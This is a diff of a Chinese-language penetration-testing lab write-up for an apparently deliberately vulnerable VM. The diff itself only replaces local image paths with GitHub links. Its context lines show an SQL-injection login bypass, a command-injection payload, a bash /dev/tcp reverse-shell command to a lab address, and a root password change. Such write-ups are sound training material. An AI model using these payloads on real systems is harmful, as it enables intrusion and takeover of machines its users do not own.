@@ -101,7 +101,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 访问首页访问源代码，发现一个登录页面：
 
-<img src="/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/1.png" alt="image-20220505130635868" style="zoom:80%;" />
+[1.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png)
 
 
 ~~~html
@@ -145,15 +145,15 @@ OS and Service detection performed. Please report any incorrect results at https
 >
 > `psw:' or '1'='1`
 
-![image-20220505131104208](/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/2.png)
+[!2.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png)
 
 `payload:127.0.0.1;pwd;whoami;`
 
-![image-20220505131343123](/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/3.png)
+[!3.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png)
 
 寻找写权限的目录：
 
-![image-20220505131600735](/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/4.png)
+[!4.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png)
 
 > 弹shell
 
@@ -161,7 +161,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 `192.168.1.7;bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/8888 <&1';`
 
-![image-20220505132210669](/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/5.png)
+[!5.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png)
 
 
 
@@ -182,4 +182,4 @@ Changing password for user root.
 passwd: all authentication tokens updated successfully.
 ~~~
 
-![image-20220505134405157](/Users/tiantianzhang/Documents/typora笔记/自我学习笔记/Untitled.assets/6.png)
+[!6.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png)
